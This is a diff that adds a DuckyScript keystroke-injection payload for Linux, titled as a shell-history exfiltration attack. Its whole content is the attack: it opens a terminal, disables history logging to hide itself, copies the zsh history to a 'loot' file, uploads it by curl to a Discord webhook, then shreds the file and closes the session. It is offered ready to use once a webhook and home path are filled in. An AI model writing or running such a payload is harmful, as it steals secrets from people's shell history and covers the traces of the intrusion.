@@ -1,0 +1,30 @@
+REM TITLE: Shell History Exfil Linux
+REM AUTHOR: OSINTI4L
+REM TARGET OS: Linux (tested on Kali Linux)
+REM DESCRIPTION: Outputs the command line interface (CLI) shell history to a text file (loot.txt), exfiltrates via Discord webhook, disables current terminal session and shreds file after sending to obfuscate itself. If using BASH for shell, change line 18 to .bash_history. To work: place Discord webhook on line 21, place path to home directory on line 23.
+
+REM Begin attack:
+ATTACKMODE HID
+DELAY 1000
+
+REM Opening terminal:
+CTRL ALT t
+DELAY 150
+
+REM Disabling current terminal session history to obfuscate:
+STRINGLN unset HISTFILE
+
+REM Copying shell history:
+STRINGLN cat .zsh_history > loot.txt
+
+REM Exfiltrating "loot.txt" via Discord webhook:
+DEFINE WEBHOOK_URL https://discord.com/api/webhooks/PLACE/DISCORD/WEBHOOK
+    STRINGLN curl -X POST -H "Content-Type: multipart/form-data" \
+    STRINGLN -F "file=@/home/ENTER_USER/loot.txt" \
+    STRINGLN -F "content=$ Loot Incoming $" \
+    STRINGLN WEBHOOK_URL
+ 	   DELAY 100
+
+REM Obfuscation stage, shred "loot.txt" and exit:
+STRINGLN shred -fuz loot.txt
+STRINGLN exit
